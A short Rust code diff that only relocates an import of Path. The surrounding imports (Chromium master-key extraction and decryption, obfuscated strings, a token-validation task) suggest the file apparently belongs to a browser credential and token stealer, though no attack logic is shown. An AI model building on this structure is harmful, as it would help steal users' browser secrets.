@@ -6,13 +6,13 @@ use alloc::vec::Vec;
 use browsers::chromium::{decrypt_protected_data, extract_master_key};
 use collector::{Collector, Software};
 use core::fmt::{Display, Formatter};
+use filesystem::path::Path;
 use filesystem::storage::StorageFileSystem;
 use filesystem::{FileSystem, WriteTo};
 use obfstr::obfstr as s;
 use requests::{Request, RequestBuilder, ResponseBodyExt};
 use tasks::{impl_composite_task_runner, parent_name, CompositeTask, Task};
 use utils::base64::base64_decode;
-use utils::path::Path;
 
 struct TokenValidationTask {
     token: String,
